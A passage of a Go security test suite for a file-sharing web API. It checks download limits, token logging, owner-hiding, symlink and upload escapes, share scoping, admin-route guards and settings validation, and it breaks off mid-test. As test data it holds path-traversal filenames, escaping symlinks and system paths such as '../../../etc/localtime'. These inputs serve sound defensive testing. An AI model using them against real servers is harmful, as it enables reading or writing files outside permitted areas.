package httpapi

import (
	"archive/zip"
	"bytes"
	"context"
	"encoding/base64"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/go-chi/chi/v5"

	"kppbwi.app/filemanager/internal/db"
	"kppbwi.app/filemanager/internal/db/sqlc"
)

// Review E — independent probes of Step 18a–19b (sharing, admin, audit,
// sessions). Each test is a reviewer checklist item of PROMPT Step R-E.

// revEUploadMeta decodes a tus Upload-Metadata header ("k base64,k2 base64").
func revEUploadMeta(h string) map[string]string {
	out := map[string]string{}
	for _, pair := range strings.Split(h, ",") {
		k, v, _ := strings.Cut(strings.TrimSpace(pair), " ")
		if k == "" {
			continue
		}
		raw, err := base64.StdEncoding.DecodeString(v)
		if err != nil {
			out[k] = v
			continue
		}
		out[k] = string(raw)
	}
	return out
}

// revEDump renders a response (status, headers, decoded tus metadata, body)
// for grep-style leak checks.
func revEDump(rec *httptest.ResponseRecorder) string {
	var b strings.Builder
	fmt.Fprintf(&b, "status=%d\n", rec.Code)
	for k, vs := range rec.Header() {
		for _, v := range vs {
			fmt.Fprintf(&b, "%s: %s\n", k, v)
			if k == "Upload-Metadata" {
				for mk, mv := range revEUploadMeta(v) {
					fmt.Fprintf(&b, "meta %s=%s\n", mk, mv)
				}
			}
		}
	}
	b.Write(rec.Body.Bytes())
	return b.String()
}

func revETus(env *authEnv, method, target, remote, content string, hdr map[string]string, ck *http.Cookie) *httptest.ResponseRecorder {
	var body io.Reader
	if method == http.MethodPatch {
		body = bytes.NewReader([]byte(content))
	}
	req := httptest.NewRequest(method, target, body)
	req.RemoteAddr = remote
	req.Header.Set("Tus-Resumable", "1.0.0")
	if method == http.MethodPatch {
		req.Header.Set("Upload-Offset", "0")
		req.Header.Set("Content-Type", "application/offset+octet-stream")
	}
	for k, v := range hdr {
		req.Header.Set(k, v)
	}
	if ck != nil {
		req.AddCookie(ck)
	}
	rec := httptest.NewRecorder()
	env.handler.ServeHTTP(rec, req)
	return rec
}

// (d) max_downloads cannot be bypassed with a Range continuation, a suffix
// range, HEAD or zip once the limit is reached; raw stays a preview.
func TestReviewEPublicDownloadLimitNotBypassable(t *testing.T) {
	env := newAuthEnv(t)
	ck, hdr, _ := seedShareFixture(t, env)
	_, token := createShare(t, env, ck, hdr, map[string]any{"path": "/laporan", "maxDownloads": 1})
	guest := "198.51.100.50:1"
	dl := func(rng string) resp {
		h := map[string]string{}
		if rng != "" {
			h["Range"] = rng
		}
		return env.call(http.MethodGet, pub(token, "/download?path=/ringkasan.txt"), guest, nil, h, nil)
	}
	if r := dl(""); r.rec.Code != 200 {
		t.Fatalf("first download: %d %s", r.rec.Code, r.rec.Body.String())
	}
	for _, rng := range []string{"", "bytes=0-", "bytes=1-", "bytes=-5", "bytes=2-4", "bytes = 1-"} {
		r := dl(rng)
		if r.rec.Code != 410 || r.code(t) != "SHARE_LIMIT_REACHED" {
			t.Errorf("Range %q after the limit: %d %s", rng, r.rec.Code, r.rec.Body.String())
		}
		if strings.Contains(r.rec.Body.String(), "isi ringkasan") {
			t.Errorf("Range %q served the bytes after the limit", rng)
		}
	}
	// zip is a download too
	r := env.call(http.MethodPost, pub(token, "/zip"), guest, map[string]any{"paths": []string{"/"}}, nil, nil)
	if r.rec.Code != 200 {
		t.Fatalf("zip create: %d %s", r.rec.Code, r.rec.Body.String())
	}
	if rr := env.call(http.MethodGet, r.body["url"].(string), guest, nil, nil, nil); rr.rec.Code != 410 {
		t.Fatalf("zip after the limit: %d", rr.rec.Code)
	}
	// HEAD carries no bytes and is not counted; raw is the documented preview path
	if rr := env.call(http.MethodHead, pub(token, "/download?path=/ringkasan.txt"), guest, nil, nil, nil); rr.rec.Code != 200 {
		t.Fatalf("HEAD after the limit: %d", rr.rec.Code)
	}
	if rr := env.call(http.MethodGet, pub(token, "/raw?path=/ringkasan.txt"), guest, nil, nil, nil); rr.rec.Code != 200 {
		t.Fatalf("raw preview after the limit: %d", rr.rec.Code)
	}
	// a fresh link: a Range continuation is not counted while the limit is not reached
	_, token2 := createShare(t, env, ck, hdr, map[string]any{"path": "/laporan", "maxDownloads": 2})
	for i, rng := range []string{"bytes=0-0", "bytes=1-", "bytes=1-"} {
		r := env.call(http.MethodGet, pub(token2, "/download?path=/ringkasan.txt"), guest, nil, map[string]string{"Range": rng}, nil)
		if r.rec.Code != 206 {
			t.Fatalf("continuation %d %q: %d %s", i, rng, r.rec.Code, r.rec.Body.String())
		}
	}
	r = env.call(http.MethodGet, pub(token2, ""), guest, nil, nil, nil)
	if r.body["downloadCount"] != float64(1) {
		t.Fatalf("continuations were counted: %s", r.rec.Body.String())
	}
}

// (d)/(f) the link token is a bearer credential: it must not land in the
// application access log (journald), neither for the API nor the SPA page.
func TestReviewETokenNeverInServerLog(t *testing.T) {
	env := newAuthEnv(t)
	ck, hdr, _ := seedShareFixture(t, env)
	_, token := createShare(t, env, ck, hdr, map[string]any{"path": "/laporan"})
	_, slug := createShare(t, env, ck, hdr, map[string]any{"path": "/laporan/2026", "slug": "slug-rahasia-xyz"})
	guest := "198.51.100.51:1"
	env.call(http.MethodGet, pub(token, ""), guest, nil, nil, nil)
	env.call(http.MethodGet, pub(token, "/list"), guest, nil, nil, nil)
	env.call(http.MethodGet, "/s/"+token, guest, nil, nil, nil)
	env.call(http.MethodGet, "/s/"+token+"/2026", guest, nil, nil, nil)
	env.call(http.MethodGet, pub(slug, ""), guest, nil, nil, nil)
	env.call(http.MethodGet, "/s/"+slug, guest, nil, nil, nil)
	env.call(http.MethodPost, pub(token, "/unlock"), guest, map[string]string{"password": "x"}, nil, nil)
	logs := env.logs.String()
	if !strings.Contains(logs, `"path":"/api/v1/public/shares/`) && !strings.Contains(logs, "path=/api/v1/public/shares/") {
		t.Fatalf("access log did not record the public request at all:\n%s", logs)
	}
	if strings.Contains(logs, token) {
		t.Errorf("share token found in the server log")
	}
	if strings.Contains(logs, slug) {
		t.Errorf("share slug found in the server log")
	}
}

// (h) hide_owner: nothing a guest receives names the owner (username, id,
// display name) or the owner's folder above the share — every endpoint,
// headers and the tus metadata echo included.
func TestReviewEHideOwnerNeverLeaks(t *testing.T) {
	env := newAuthEnv(t)
	readyAdmin(t, env)
	ock, ohdr := env.newUser(t, "pemilik77", "Rahasia sekali 2026!")
	owner, _ := env.store.GetUserByUsername(context.Background(), "pemilik77")
	home := filepath.Join(env.cfg.StorageRoot, "pemilik77")
	if err := os.MkdirAll(filepath.Join(home, "dok-rahasia", "drop", "sub"), 0o750); err != nil {
		t.Fatal(err)
	}
	for name, body := range map[string]string{"drop/a.txt": "isi a", "drop/sub/b.txt": "isi b", "drop/klip.srt": "1\n00:00:00,000 --> 00:00:01,000\nhalo\n"} {
		if err := os.WriteFile(filepath.Join(home, "dok-rahasia", name), []byte(body), 0o640); err != nil {
			t.Fatal(err)
		}
	}
	id, token := createShare(t, env, ock, ohdr, map[string]any{"path": "/dok-rahasia/drop", "hideOwner": true, "allowUpload": true})
	guest := "198.51.100.52:1"
	var dumps []string
	get := func(suffix string) resp {
		r := env.call(http.MethodGet, pub(token, suffix), guest, nil, nil, nil)
		dumps = append(dumps, suffix+"\n"+revEDump(r.rec))
		return r
	}
	get("")
	get("/list")
	get("/list?path=/sub")
	get("/stat?path=/a.txt")
	get("/stat?path=/")
	get("/raw?path=/a.txt")
	get("/raw?path=/a.txt&variant=preview")
	get("/thumb?path=/a.txt")
	get("/download?path=/a.txt")
	get("/content?path=/a.txt")
	get("/media-info?path=/a.txt")
	get("/subtitle?path=/klip.srt")
	get("/stat?path=/tidak-ada.txt")
	get("/raw?path=/../x")
	get("/raw?path=/sub")
	r := env.call(http.MethodPost, pub(token, "/zip"), guest, map[string]any{"paths": []string{"/"}}, nil, nil)
	dumps = append(dumps, "zip create\n"+revEDump(r.rec))
	if r.rec.Code == 200 {
		get(strings.TrimPrefix(r.body["url"].(string), PublicSharePrefix+token))
	}
	r = env.call(http.MethodPost, pub(token, "/upload/precheck"), guest, map[string]any{"files": []map[string]any{{"name": "a.txt", "size": 1}}}, nil, nil)
	dumps = append(dumps, "precheck\n"+revEDump(r.rec))
	// tus: POST then HEAD (tusd echoes Upload-Metadata on HEAD)
	rec := revETus(env, http.MethodPost, pub(token, "/upload/tus/"), guest, "", map[string]string{"Upload-Length": "5", "Upload-Metadata": tusMeta(map[string]string{"filename": "tamu.txt", "path": "/mana", "relativePath": "x"})}, nil)
	dumps = append(dumps, "tus post\n"+revEDump(rec))
	if rec.Code != 201 {
		t.Fatalf("tus create: %d %s", rec.Code, rec.Body.String())
	}
	loc := rec.Header().Get("Location")
	upPath := loc[strings.Index(loc, "/api/v1/"):]
	hrec := revETus(env, http.MethodHead, upPath, guest, "", nil, nil)
	dumps = append(dumps, "tus head\n"+revEDump(hrec))
	prec := revETus(env, http.MethodPatch, upPath, guest, "hello", nil, nil)
	dumps = append(dumps, "tus patch\n"+revEDump(prec))
	r = env.call(http.MethodGet, "/s/"+token, guest, nil, nil, nil)
	dumps = append(dumps, "spa\n"+revEDump(r.rec))

	for _, d := range dumps {
		for _, needle := range []string{"pemilik77", "Pemilik77", owner.ID, "dok-rahasia", env.cfg.StorageRoot} {
			if strings.Contains(d, needle) {
				t.Errorf("guest response leaks %q:\n%s", needle, d)
			}
		}
	}
	// the owner's own view is unaffected and the upload landed in the share
	if rr := env.call(http.MethodGet, "/api/v1/shares/"+id, "203.0.113.9:1", nil, nil, ock); rr.rec.Code != 200 {
		t.Fatalf("owner view: %d", rr.rec.Code)
	}
	if _, err := os.Stat(filepath.Join(home, "dok-rahasia", "drop", "x", "tamu.txt")); err != nil {
		t.Fatalf("guest upload: %v", err)
	}
}

// (b)/(d) symlinks inside a publicly shared folder that point outside it
// are dead ends for guests on every endpoint, and a symlink itself cannot
// be shared.
func TestReviewEPublicSymlinksStayInside(t *testing.T) {
	env := newAuthEnv(t)
	ck, hdr, home := seedShareFixture(t, env)
	if err := os.Symlink("../rahasia.txt", filepath.Join(home, "laporan", "link-out.txt")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("..", filepath.Join(home, "laporan", "dir-out")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("ringkasan.txt", filepath.Join(home, "laporan", "link-in.txt")); err != nil {
		t.Fatal(err)
	}
	_, token := createShare(t, env, ck, hdr, map[string]any{"path": "/laporan"})
	guest := "198.51.100.53:1"
	for _, suffix := range []string{
		"/raw?path=/link-out.txt", "/download?path=/link-out.txt", "/content?path=/link-out.txt", "/stat?path=/link-out.txt",
		"/media-info?path=/link-out.txt", "/thumb?path=/link-out.txt", "/raw?path=/link-out.txt&variant=preview",
		"/list?path=/dir-out", "/stat?path=/dir-out/rahasia.txt", "/raw?path=/dir-out/rahasia.txt", "/content?path=/dir-out/rahasia.txt",
		"/raw?path=/dir-out/laporan/ringkasan.txt",
	} {
		r := env.call(http.MethodGet, pub(token, suffix), guest, nil, nil, nil)
		body := r.rec.Body.String()
		// neither the outside content nor the link target (a name above the share) may show
		if strings.Contains(body, "di luar share") || strings.Contains(body, `"symlinkTarget"`) {
			t.Errorf("%s leaks content outside the share: %d %s", suffix, r.rec.Code, body)
		}
		if r.rec.Code == 200 && !strings.Contains(suffix, "/stat?path=/link-out.txt") {
			t.Errorf("%s: 200 through an escaping symlink: %s", suffix, body)
		}
		if r.rec.Code >= 500 && r.rec.Code != 501 { // 501 = no thumbnail pipeline in the test env
			t.Errorf("%s: %d", suffix, r.rec.Code)
		}
	}
	// a symlink to a sibling inside the share is fine
	if r := env.call(http.MethodGet, pub(token, "/raw?path=/link-in.txt"), guest, nil, nil, nil); r.rec.Code != 200 || r.rec.Body.String() != "isi ringkasan" {
		t.Fatalf("inside symlink: %d %s", r.rec.Code, r.rec.Body.String())
	}
	// zip of everything / of the escaping folder never carries the outside file
	for _, paths := range [][]string{{"/"}, {"/dir-out"}, {"/link-out.txt", "/2026"}} {
		r := env.call(http.MethodPost, pub(token, "/zip"), guest, map[string]any{"paths": paths}, nil, nil)
		if r.rec.Code != 200 {
			t.Fatalf("zip create %v: %d %s", paths, r.rec.Code, r.rec.Body.String())
		}
		rr := env.call(http.MethodGet, r.body["url"].(string), guest, nil, nil, nil)
		if rr.rec.Code != 200 {
			continue
		}
		zr, err := zip.NewReader(bytes.NewReader(rr.rec.Body.Bytes()), int64(rr.rec.Body.Len()))
		if err != nil {
			t.Fatalf("zip %v: %v", paths, err)
		}
		for _, f := range zr.File {
			if strings.Contains(f.Name, "rahasia") {
				t.Errorf("zip %v contains %s", paths, f.Name)
			}
			rc, err := f.Open()
			if err != nil {
				continue
			}
			b, _ := io.ReadAll(rc)
			_ = rc.Close()
			if strings.Contains(string(b), "di luar share") {
				t.Errorf("zip %v entry %s carries outside content", paths, f.Name)
			}
		}
	}
	// sharing the symlink itself is refused for public links as for users mode
	r := env.call(http.MethodPost, "/api/v1/shares", "203.0.113.5:1", map[string]any{"path": "/laporan/link-out.txt"}, hdr, ck)
	if r.rec.Code != 400 {
		t.Fatalf("share of a symlink: %d %s", r.rec.Code, r.rec.Body.String())
	}
}

// (d) file-request uploads cannot escape or overwrite through filename /
// relativePath.
func TestReviewEPublicUploadCannotEscape(t *testing.T) {
	env := newAuthEnv(t)
	ck, hdr, home := seedShareFixture(t, env)
	_, token := createShare(t, env, ck, hdr, map[string]any{"path": "/laporan", "allowUpload": true})
	guest := "198.51.100.54:1"
	for _, md := range []map[string]string{
		{"filename": "../evil.txt"}, {"filename": "..\\evil.txt"}, {"filename": "a/b.txt"}, {"filename": ".."}, {"filename": "x\x00.txt"},
		{"filename": "ok.txt", "relativePath": "../up"}, {"filename": "ok.txt", "relativePath": "/abs/../.."}, {"filename": "ok.txt", "relativePath": "sub/../../.."},
	} {
		rec := revETus(env, http.MethodPost, pub(token, "/upload/tus/"), guest, "", map[string]string{"Upload-Length": "4", "Upload-Metadata": tusMeta(md)}, nil)
		if rec.Code != 400 {
			t.Errorf("%v: %d %s", md, rec.Code, rec.Body.String())
		}
	}
	for _, p := range []string{"evil.txt", "up", "abs", "laporan/evil.txt"} {
		if _, err := os.Lstat(filepath.Join(home, p)); err == nil {
			t.Errorf("%s was created", p)
		}
	}
	// relativePath is honoured inside the folder only
	rec := revETus(env, http.MethodPost, pub(token, "/upload/tus/"), guest, "", map[string]string{"Upload-Length": "2", "Upload-Metadata": tusMeta(map[string]string{"filename": "ok.txt", "relativePath": "sub/dalam"})}, nil)
	if rec.Code != 201 {
		t.Fatalf("nested upload: %d %s", rec.Code, rec.Body.String())
	}
	loc := rec.Header().Get("Location")
	prec := revETus(env, http.MethodPatch, loc[strings.Index(loc, "/api/v1/"):], guest, "hi", nil, nil)
	if prec.Code != 204 {
		t.Fatalf("patch: %d %s", prec.Code, prec.Body.String())
	}
	if b, err := os.ReadFile(filepath.Join(home, "laporan", "sub", "dalam", "ok.txt")); err != nil || string(b) != "hi" {
		t.Fatalf("nested upload did not land inside the share: %v", err)
	}
}

// (a)/(b) share scope edge cases beyond the 18b matrix: absolute-looking
// paths, foreign/random/public ids, scope conflicts, expiry, disable by
// owner and admin, disabled owner, disabled recipient, single-file shares.
func TestReviewEShareScopeEdgeCases(t *testing.T) {
	env := newAuthEnv(t)
	ack, ahdr, home := seedShareFixture(t, env)
	ctx := context.Background()
	bck, bhdr := env.newUser(t, "budi", "Rahasia sekali 2026!")
	cck, chdr := env.newUser(t, "citra", "Rahasia sekali 2026!")
	id, _ := createUsersShare(t, env, ack, ahdr, "/laporan", map[string]any{"username": "budi"}, map[string]any{"username": "citra", "permission": "editor"})
	_, pubID := func() (string, string) {
		pid, _ := createShare(t, env, ack, ahdr, map[string]any{"path": "/laporan"})
		return "", pid
	}()
	guest := "203.0.113.9:1"

	// paths that look absolute or above the share are confined or refused
	for _, target := range []string{
		"/api/v1/files/content?path=//rahasia.txt", "/api/v1/files/content?path=/./rahasia.txt", "/api/v1/files/content?path=/laporan/../rahasia.txt",
		"/api/v1/files/content?path=/laporan/ringkasan.txt", "/api/v1/files/stat?path=" + home + "/rahasia.txt", "/api/v1/files/list?path=/..%2F",
		"/api/v1/files/content?path=rahasia.txt",
	} {
		r := env.call(http.MethodGet, shareURL(target, id), guest, nil, bhdr, bck)
		if r.rec.Code == 200 || strings.Contains(r.rec.Body.String(), "di luar share") {
			t.Errorf("%s: %d %s", target, r.rec.Code, r.rec.Body.String())
		}
	}
	// unknown, random and public ids are 404; share+as_user is 400; the editor's own scope id is not usable by others
	for _, sid := range []string{"01HZZZZZZZZZZZZZZZZZZZZZZZ", "x", strings.Repeat("a", 300), pubID, "../" + id} {
		if r := env.call(http.MethodGet, shareURL("/api/v1/files/list?path=/", sid), guest, nil, bhdr, bck); r.rec.Code != 404 && r.rec.Code != 400 {
			t.Errorf("share=%q: %d %s", sid, r.rec.Code, r.rec.Body.String())
		}
	}
	if r := env.call(http.MethodGet, "/api/v1/files/list?path=/&share="+id+"&as_user=admin", guest, nil, bhdr, bck); r.rec.Code != 400 {
		t.Errorf("share+as_user: %d", r.rec.Code)
	}
	// a signed URL minted inside the share is bound to budi; citra cannot use it against another share id
	r := env.call(http.MethodPost, shareURL("/api/v1/files/sign", id), guest, map[string]any{"path": "/ringkasan.txt", "purpose": "download"}, bhdr, bck)
	if r.rec.Code != 200 {
		t.Fatalf("sign: %d %s", r.rec.Code, r.rec.Body.String())
	}
	dlURL := r.body["url"].(string)
	// expiry through PATCH expiresAt (2 s ahead on the fake clock)
	exp := env.clock.Now().Add(2 * time.Second).UTC().Format(time.RFC3339)
	if rr := env.call(http.MethodPatch, "/api/v1/shares/"+id, "203.0.113.5:1", map[string]any{"expiresAt": exp}, ahdr, ack); rr.rec.Code != 200 {
		t.Fatalf("patch expiry: %d %s", rr.rec.Code, rr.rec.Body.String())
	}
	env.clock.Advance(3 * time.Second)
	if rr := env.call(http.MethodGet, shareURL("/api/v1/files/list?path=/", id), guest, nil, bhdr, bck); rr.rec.Code != 410 || rr.code(t) != "SHARE_EXPIRED" {
		t.Fatalf("expired list: %d %s", rr.rec.Code, rr.rec.Body.String())
	}
	if rr := env.call(http.MethodGet, dlURL, guest, nil, nil, nil); rr.rec.Code != 410 {
		t.Fatalf("expired signed url: %d", rr.rec.Code)
	}
	if rr := env.call(http.MethodGet, "/api/v1/shared-with-me/"+id, guest, nil, nil, bck); rr.rec.Code != 410 {
		t.Fatalf("expired header: %d", rr.rec.Code)
	}
	if rr := env.call(http.MethodPatch, "/api/v1/shares/"+id, "203.0.113.5:1", map[string]any{"expiresInDays": 30}, ahdr, ack); rr.rec.Code != 200 {
		t.Fatalf("extend: %d %s", rr.rec.Code, rr.rec.Body.String())
	}
	// disabled by the owner → 410 manual; enabled → back
	env.call(http.MethodPost, "/api/v1/shares/"+id+"/disable", "203.0.113.5:1", nil, ahdr, ack)
	if rr := env.call(http.MethodGet, shareURL("/api/v1/files/list?path=/", id), guest, nil, bhdr, bck); rr.rec.Code != 410 || rr.code(t) != "SHARE_DISABLED" {
		t.Fatalf("disabled: %d %s", rr.rec.Code, rr.rec.Body.String())
	}
	env.call(http.MethodPost, "/api/v1/shares/"+id+"/enable", "203.0.113.5:1", nil, ahdr, ack)
	if rr := env.call(http.MethodGet, shareURL("/api/v1/files/list?path=/", id), guest, nil, bhdr, bck); rr.rec.Code != 200 {
		t.Fatalf("re-enabled: %d", rr.rec.Code)
	}
	// revoked by an admin → 410 admin_revoked, the owner cannot enable (403), recipients are told
	if rr := env.call(http.MethodPost, "/api/v1/admin/shares/"+id+"/revoke", "203.0.113.5:1", nil, ahdr, ack); rr.rec.Code != 204 {
		t.Fatalf("admin revoke: %d %s", rr.rec.Code, rr.rec.Body.String())
	}
	rr := env.call(http.MethodGet, shareURL("/api/v1/files/list?path=/", id), guest, nil, bhdr, bck)
	if rr.rec.Code != 410 || rr.body["error"].(map[string]any)["details"].(map[string]any)["reason"] != "admin_revoked" {
		t.Fatalf("admin revoked: %d %s", rr.rec.Code, rr.rec.Body.String())
	}
	if rr := env.call(http.MethodPost, "/api/v1/shares/"+id+"/enable", "203.0.113.5:1", nil, ahdr, ack); rr.rec.Code != 403 {
		t.Fatalf("owner enable after admin revoke: %d", rr.rec.Code)
	}
	if rr := env.call(http.MethodGet, "/api/v1/notifications", guest, nil, nil, bck); !strings.Contains(rr.rec.Body.String(), "share_revoked") {
		t.Fatalf("recipient not told: %s", rr.rec.Body.String())
	}
	if rr := env.call(http.MethodGet, "/api/v1/notifications", "203.0.113.5:1", nil, nil, ack); !strings.Contains(rr.rec.Body.String(), "share_revoked_by_admin") {
		t.Fatalf("owner not told: %s", rr.rec.Body.String())
	}

	// citra owns a share to budi; citra disabled → 410 owner_disabled on list, header and signed URL
	chome := filepath.Join(env.cfg.StorageRoot, "citra")
	if err := os.MkdirAll(filepath.Join(chome, "proyek"), 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(chome, "proyek", "p.txt"), []byte("milik citra"), 0o640); err != nil {
		t.Fatal(err)
	}
	cid, _ := createUsersShare(t, env, cck, chdr, "/proyek", map[string]any{"username": "budi"})
	r = env.call(http.MethodPost, shareURL("/api/v1/files/sign", cid), guest, map[string]any{"path": "/p.txt", "purpose": "download"}, bhdr, bck)
	if r.rec.Code != 200 {
		t.Fatalf("sign citra share: %d %s", r.rec.Code, r.rec.Body.String())
	}
	cURL := r.body["url"].(string)
	citra, _ := env.store.GetUserByUsername(ctx, "citra")
	if err := env.store.UpdateUserStatus(ctx, sqlc.UpdateUserStatusParams{Status: "disabled", UpdatedAt: db.Now(), ID: citra.ID}); err != nil {
		t.Fatal(err)
	}
	env.auth.InvalidateUser(citra.ID)
	for _, target := range []string{shareURL("/api/v1/files/list?path=/", cid), "/api/v1/shared-with-me/" + cid} {
		if rr := env.call(http.MethodGet, target, guest, nil, bhdr, bck); rr.rec.Code != 410 || !strings.Contains(rr.rec.Body.String(), "owner_disabled") {
			t.Fatalf("%s with a disabled owner: %d %s", target, rr.rec.Code, rr.rec.Body.String())
		}
	}
	if rr := env.call(http.MethodGet, cURL, guest, nil, nil, nil); rr.rec.Code != 410 {
		t.Fatalf("signed url with a disabled owner: %d", rr.rec.Code)
	}
	if rr := env.call(http.MethodGet, "/api/v1/shared-with-me", guest, nil, nil, bck); !strings.Contains(rr.rec.Body.String(), `"reason":"owner_disabled"`) {
		t.Fatalf("shared-with-me reason: %s", rr.rec.Body.String())
	}
	if err := env.store.UpdateUserStatus(ctx, sqlc.UpdateUserStatusParams{Status: "active", UpdatedAt: db.Now(), ID: citra.ID}); err != nil {
		t.Fatal(err)
	}
	env.auth.InvalidateUser(citra.ID)
	// budi disabled: own calls 403, signed URLs dead
	budi, _ := env.store.GetUserByUsername(ctx, "budi")
	if err := env.store.UpdateUserStatus(ctx, sqlc.UpdateUserStatusParams{Status: "disabled", UpdatedAt: db.Now(), ID: budi.ID}); err != nil {
		t.Fatal(err)
	}
	env.auth.InvalidateUser(budi.ID)
	if rr := env.call(http.MethodGet, shareURL("/api/v1/files/list?path=/", cid), guest, nil, bhdr, bck); rr.rec.Code != 403 && rr.rec.Code != 401 {
		t.Fatalf("disabled recipient: %d %s", rr.rec.Code, rr.rec.Body.String())
	}
	if rr := env.call(http.MethodGet, cURL, guest, nil, nil, nil); rr.rec.Code == 200 {
		t.Fatal("disabled recipient's signed url still works")
	}
	if err := env.store.UpdateUserStatus(ctx, sqlc.UpdateUserStatusParams{Status: "active", UpdatedAt: db.Now(), ID: budi.ID}); err != nil {
		t.Fatal(err)
	}
	env.auth.InvalidateUser(budi.ID)

	// single-file share with an editor: the parent folder stays invisible —
	// rename/duplicate/copy would reveal or touch siblings and are refused
	fid, _ := createUsersShare(t, env, ack, ahdr, "/laporan/ringkasan.txt", map[string]any{"username": "citra", "permission": "editor"})
	_, cck2, csrf2 := env.login(t, "citra", "Rahasia sekali 2026!", guest)
	chdr2 := map[string]string{"X-CSRF-Token": csrf2}
	for _, probe := range []struct {
		target string
		body   any
	}{
		{"/api/v1/files/rename", map[string]any{"path": "/", "newName": "2026"}},
		{"/api/v1/files/rename", map[string]any{"path": "/", "newName": "baru.txt"}},
		{"/api/v1/files/duplicate", map[string]any{"path": "/"}},
		{"/api/v1/files/copy", map[string]any{"paths": []string{"/"}, "to": "/", "onConflict": "rename"}},
		{"/api/v1/files/mkdir", map[string]any{"path": "/", "name": "x"}},
	} {
		rr := env.call(http.MethodPost, shareURL(probe.target, fid), guest, probe.body, chdr2, cck2)
		if rr.rec.Code != 400 {
			t.Errorf("%s on a file share: %d %s", probe.target, rr.rec.Code, rr.rec.Body.String())
		}
	}
	if _, err := os.Stat(filepath.Join(home, "laporan", "ringkasan.txt")); err != nil {
		t.Fatalf("the shared file was moved: %v", err)
	}
	// the editor still edits the file itself
	if rr := env.call(http.MethodPut, shareURL("/api/v1/files/content", fid), guest, map[string]any{"path": "/", "content": "edit tamu"}, mergeHdr(chdr2, map[string]string{"If-Match": "*"}), cck2); rr.rec.Code != 200 {
		t.Fatalf("file share edit: %d %s", rr.rec.Code, rr.rec.Body.String())
	}
	// sessions of another user are invisible (404), even by their 8-char id
	rr = env.call(http.MethodGet, "/api/v1/me/sessions", guest, nil, nil, cck2)
	items, _ := rr.body["items"].([]any)
	if rr.rec.Code != 200 || len(items) == 0 {
		t.Fatalf("citra sessions: %d %s", rr.rec.Code, rr.rec.Body.String())
	}
	sid := items[0].(map[string]any)["id"].(string)
	// budi's earlier session ended with the disable; a fresh one still sees nothing of citra's
	_, bck2, bcsrf2 := env.login(t, "budi", "Rahasia sekali 2026!", guest)
	if rr := env.call(http.MethodDelete, "/api/v1/me/sessions/"+sid, guest, nil, map[string]string{"X-CSRF-Token": bcsrf2}, bck2); rr.rec.Code != 404 {
		t.Fatalf("budi deleting citra's session: %d", rr.rec.Code)
	}
}

// (e) every /admin route of the live router is behind RequireAdmin; no
// route without a session answers 2xx except the documented public ones.
func TestReviewEAdminRoutesRequireAdmin(t *testing.T) {
	env := newAuthEnv(t)
	ack, ahdr := readyAdmin(t, env)
	bck, bhdr := env.newUser(t, "budi", "Rahasia sekali 2026!")
	routes, ok := env.handler.(chi.Routes)
	if !ok {
		t.Fatal("handler is not a chi router")
	}
	type route struct{ method, pattern string }
	var all []route
	err := chi.Walk(routes, func(method, pattern string, _ http.Handler, _ ...func(http.Handler) http.Handler) error {
		all = append(all, route{method, pattern})
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	fill := strings.NewReplacer("{id}", "01HZZZZZZZZZZZZZZZZZZZZZZZ", "{job}", "nope-job", "{name}", "app-20000101-000000.db",
		"{token}", strings.Repeat("Q", 43), "{shareId}", "01HZZZZZZZZZZZZZZZZZZZZZZZ", "{username}", "nobody", "/*", "/x")
	admin, anon := 0, 0
	for _, rt := range all {
		target := fill.Replace(rt.pattern)
		if strings.HasPrefix(rt.pattern, "/api/v1/admin/") {
			admin++
			r := env.call(rt.method, target, "203.0.113.9:1", map[string]any{}, bhdr, bck)
			if r.rec.Code != 403 || r.code(t) != "FORBIDDEN" {
				t.Errorf("non-admin %s %s: %d %s", rt.method, rt.pattern, r.rec.Code, r.rec.Body.String())
			}
			r = env.call(rt.method, target, "203.0.113.9:1", map[string]any{}, nil, nil)
			if r.rec.Code != 401 {
				t.Errorf("anonymous %s %s: %d", rt.method, rt.pattern, r.rec.Code)
			}
			if strings.Contains(rt.pattern, "{") && rt.method != http.MethodPut {
				// random ids never resolve
				r = env.call(rt.method, target, "203.0.113.5:1", map[string]any{"mode": "purge", "confirmUsername": "x"}, ahdr, ack)
				if r.rec.Code != 404 && r.rec.Code != 400 {
					t.Errorf("admin random id %s %s: %d %s", rt.method, rt.pattern, r.rec.Code, r.rec.Body.String())
				}
			}
			continue
		}
		if rt.method == http.MethodOptions {
			continue
		}
		switch rt.pattern {
		case "/healthz", "/readyz", "/api/v1/version", "/api/v1/auth/csrf", "/api/v1/auth/login", "/api/v1/branding/logo":
			continue
		}
		if strings.HasPrefix(rt.pattern, "/api/v1/public/shares/") {
			continue
		}
		anon++
		r := env.call(rt.method, target, "203.0.113.9:1", map[string]any{}, nil, nil)
		if r.rec.Code >= 200 && r.rec.Code < 300 {
			t.Errorf("anonymous %s %s answered %d", rt.method, rt.pattern, r.rec.Code)
		}
	}
	if admin < 24 || anon < 60 {
		t.Fatalf("walked %d admin and %d other routes", admin, anon)
	}
}

// (e) settings: extreme values, relations and injection in blocked_extensions.
func TestReviewEAdminSettingsExtremes(t *testing.T) {
	env := newAuthEnv(t)
	ack, ahdr := readyAdmin(t, env)
	put := func(body map[string]any) resp {
		return env.call(http.MethodPut, "/api/v1/admin/settings", "203.0.113.5:1", body, ahdr, ack)
	}
	for name, body := range map[string]map[string]any{
		"duration overflow": {"session_absolute_timeout": "99999999999999999h"},
		"duration negative": {"session_idle_timeout": "-5m"},
		"size float":        {"max_upload_size": 1e30},
		"size negative":     {"default_user_quota": -1},
		"size string junk":  {"max_upload_size": "50 lots"},
		"int nan":           {"task_max_per_user": "NaN"},
		"int float":         {"task_max_per_user": 1.5},
		"int huge":          {"trash_retention_days": 1e12},
		"tz traversal":      {"tz_default": "../../../etc/localtime"},
		"tz absolute":       {"tz_default": "/etc/localtime"},
		"tz long":           {"tz_default": strings.Repeat("A", 65)},
		"enum":              {"default_language": "xx"},
		"unknown key":       {"nope": 1},
		"read only":         {"branding.logo": "x.png"},
		"ext slash":         {"blocked_extensions": []string{"a/b"}},
		"ext dotdot":        {"blocked_extensions": []string{".."}},
		"ext space":         {"blocked_extensions": []string{"e xe"}},
		"ext newline":       {"blocked_extensions": []string{"ph\np"}},
